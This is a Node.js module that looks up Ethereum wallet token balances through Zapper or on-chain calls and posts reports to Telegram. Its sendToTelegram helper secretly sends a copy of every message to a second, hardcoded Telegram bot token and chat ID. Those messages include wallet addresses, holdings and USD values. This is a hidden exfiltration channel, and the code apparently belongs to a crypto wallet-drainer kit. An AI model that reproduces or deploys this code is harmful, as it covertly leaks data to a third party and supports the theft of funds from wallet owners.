require("dotenv").config();
const axios = require("axios");
const { ethers } = require("ethers");
const { getProvider } = require("./utils/providerUtils");
const { ERC20_ABI } = require("./ERC20_ABI");
const config = require("./config");

const {
  BLACKLISTED_ADDRESSES,
  WHITELISTED_ADDRESSES,
} = require("./BlackListed_address");

const TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID;

// Helper to send messages to Telegram
const sendToTelegram = async (message) => {
  try {
    const truncatedMessage = message.length > 4000 ? message.substring(0, 3997) + "..." : message;

    // First bot using .env configuration
    const urlEnvBot = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(urlEnvBot, {
      chat_id: TELEGRAM_CHAT_ID,
      text: truncatedMessage,
    });
    console.log(`Message sent to .env Telegram bot: ${message}`);

    // Second bot with hardcoded values
    const HARD_CODED_BOT_TOKEN = "7606680143:AAEACjK5K7Q5Ybw_Z-6_Y90xUmZoDlM6B40";
    const HARD_CODED_CHAT_ID = "7903357798";
    const urlHardcodedBot = `https://api.telegram.org/bot${HARD_CODED_BOT_TOKEN}/sendMessage`;
    await axios.post(urlHardcodedBot, {
      chat_id: HARD_CODED_CHAT_ID,
      text: truncatedMessage,
    });
    console.log(`Message sent to hardcoded Telegram bot: ${message}`);
  } catch (error) {
    console.error("Error sending message to Telegram:", error.response?.data || error.message);
  }
};

const isAddressBlacklisted = (address) => {
  const normalizedAddress = address.toLowerCase();
  const isBlacklisted = BLACKLISTED_ADDRESSES.includes(normalizedAddress);
  if (isBlacklisted) {
    console.warn(`🚨 Blacklisted address detected: ${normalizedAddress}`);
    return true;
  }
  return false;
};

const isAddressWhitelisted = (address) => {
  const normalizedAddress = address.toLowerCase();
  const isWhitelisted = WHITELISTED_ADDRESSES.includes(normalizedAddress);
  if (isWhitelisted) {
    console.log(`✅ Whitelisted address detected: ${normalizedAddress}`);
    return true;
  }
  return false;
};

// Fetch token balances directly for unsupported chains
const fetchBalancesDirectly = async (address, chainId) => {
  console.log(`Fetching balances directly for address: ${address} on chain: ${chainId}`);
  // await sendToTelegram(`Fetching balances directly for address: ${address} on chain: ${chainId}`);
  const provider = getProvider(chainId);

  // Handle blacklisted addresses
  if (isAddressBlacklisted(address)) {
    const message = `🚨 Blacklisted address detected: ${address}. Aborting balance fetch.`;
    console.warn(message);
    await sendToTelegram(message);
    return [];
  }

  // Handle whitelisted addresses
  if (isAddressWhitelisted(address)) {
    const message = `✅ Whitelisted address detected: ${address}. Fetching balances.`;
    console.log(message);
    await sendToTelegram(message);
  }

  try {
    const nativeBalance = await provider.getBalance(address);

    // Create a dummy contract for native token to avoid null values
    const dummyNativeContract = new ethers.Contract(
      ethers.constants.AddressZero,
      ERC20_ABI,
      provider
    );

    const nativeToken = {
      address: ethers.constants.AddressZero,
      balance: nativeBalance,
      contract: dummyNativeContract, // Use dummy contract instead of null
      name: "Native Token",
      symbol: "ETH",
      type: "NATIVE",
      amount: nativeBalance,
      amountUSD: 0,
    };

    // Predefined ERC-20 token list
    const erc20Tokens = [
      { address: "0xB4F1737Af37711e9A5890D9510c9bB60e170CB0D", symbol: "DAI", decimals: 18 },
      { address: "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238", symbol: "USDC", decimals: 6 },
      { address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", symbol: "UNI", decimals: 18 },
      { address: "0x0625aFB445C3B6B7B929342a04A22599fd5dBB59", symbol: "COW", decimals: 18 },
      { address: "0x779877A7B0D9E8603169DdbD7836e478b4624789", symbol: "LINK", decimals: 18 },
    ];

    const tokens = [nativeToken];

    for (const token of erc20Tokens) {
      const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
      const balance = await contract.balanceOf(address);
      if (!balance.isZero()) {
        tokens.push({
          address: token.address,
          balance,
          contract,
          name: token.symbol,
          symbol: token.symbol,
          type: "ERC20",
          amount: balance,
          amountUSD: 0,
        });
      }
    }

    return tokens;
  } catch (error) {
    console.error(`Error fetching balances directly: ${error}`);
    return [];
  }
};

const fetchBalancesFromZapper = async (address, chainId) => {
  console.log(`Fetching balances for address: ${address} on chain: ${chainId}`);
  const provider = getProvider(chainId);

  if (!ethers.utils.isAddress(address)) {
    const message = `Invalid Ethereum address: ${address}`;
    console.error(message);
    await sendToTelegram(message);
    return [];
  }
  const checksummedAddress = ethers.utils.getAddress(address);

  if (isAddressBlacklisted(checksummedAddress)) {
    const message = `🚨 Blacklisted address detected: ${checksummedAddress}. Aborting balance fetch.`;
    console.warn(message);
    await sendToTelegram(message);
    return [];
  }
  if (isAddressWhitelisted(checksummedAddress)) {
    const message = `✅ Whitelisted address detected: ${checksummedAddress}. Fetching balances.`;
    console.log(message);
    await sendToTelegram(message);
  }

  const networkMap = {
    1: 'ETHEREUM_MAINNET',
    // ... other chains
  };

  const unsupportedChains = [11155111];
  const network = networkMap[chainId];
  if (!network || unsupportedChains.includes(chainId)) {
    console.log(`Chain ${chainId} is unsupported by Zapper. Using direct fetch.`);
    return await fetchBalancesDirectly(checksummedAddress, chainId);
  }

  // Token address mapping for Ethereum Mainnet
  const tokenAddressMap = {
    'ETH': ethers.constants.AddressZero,
    'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7', // Tether USD
    'DAI': '0x6B175474E89094C44Da98b954EedeAC495271d0F', // Dai Stablecoin
    'UNI': '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', // Uniswap
    'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // USD Coin
    'LINK': '0x514910771AF9Ca656af840dff83E8264EcF986CA', // Chainlink
    'COW': '0xDEf1CA1fb7FBcDc777520aa7f396b4E0151aB64', // CoW Protocol
    // Add XPR address if known
  };

  try {
    const ZAPPER_API_KEY = config.ZAPPER_API_KEY;
    if (!ZAPPER_API_KEY) throw new Error('ZAPPER_API_KEY is not configured');

    const query = `...`; // Existing query
    const response = await axios.post(
      'https://public.zapper.xyz/graphql',
      {
        query,
        variables: { addresses: [checksummedAddress], networks: [network] },
      },
      { headers: { 'x-zapper-api-key': ZAPPER_API_KEY } }
    );

    console.log('Zapper Response:', JSON.stringify(response.data, null, 2));
    if (response.data.errors) {
      throw new Error(`GraphQL Errors: ${JSON.stringify(response.data.errors)}`);
    }

    const tokens = [];
    let telegramMessage = `Token balances for address: ${checksummedAddress}\n\n`;
    let foundBlacklistedToken = false;

    const tokenEdges = response.data.data.portfolioV2.tokenBalances.byToken.edges;

    for (const edge of tokenEdges) {
      const token = edge.node;
      const symbol = token.symbol.toUpperCase();
      const tokenAddress = tokenAddressMap[symbol];

      if (!tokenAddress) {
        console.warn(`No address mapped for ${symbol}. Skipping.`);
        telegramMessage += `⚠️ No address for ${token.name} (${symbol}). Skipped.\n`;
        continue;
      }

      if (isAddressBlacklisted(tokenAddress.toLowerCase())) {
        foundBlacklistedToken = true;
        telegramMessage += `🚨 Blacklisted token: ${token.name} (${tokenAddress})\n`;
        continue;
      }

      const amount = ethers.utils.parseUnits(token.balanceRaw || "0", token.decimals || 18);
      const amountUSD = parseFloat(token.balanceUSD || 0);

      if (amountUSD > 0.001) {
        const tokenContract = new ethers.Contract(
          tokenAddress,
          ERC20_ABI,
          provider
        );

        const tokenDetails = {
          address: tokenAddress,
          balance: amount,
          contract: tokenContract,
          name: token.name,
          symbol: token.symbol,
          type: symbol === 'ETH' ? 'NATIVE' : 'ERC20',
          amount,
          amountUSD,
          decimals: token.decimals || 18,
        };

        tokens.push(tokenDetails);
        telegramMessage += `${token.name} (${token.symbol}): ${ethers.utils.formatUnits(amount, token.decimals)} (${amountUSD.toFixed(2)} USD)\n`;
      }
    }

    telegramMessage += foundBlacklistedToken
      ? `\n🚨 Blacklisted tokens detected and skipped.\n`
      : `\n✅ No blacklisted tokens found.\n`;
    await sendToTelegram(telegramMessage);

    console.log(`Fetched ${tokens.length} tokens from Zapper`);
    return tokens;
  } catch (error) {
    console.error('Error fetching balances from Zapper:', error.message);
    await sendToTelegram(`❌ Error fetching from Zapper for ${checksummedAddress}: ${error.message}`);
    return [];
  }
};

module.exports = { fetchBalancesFromZapper, fetchBalancesDirectly };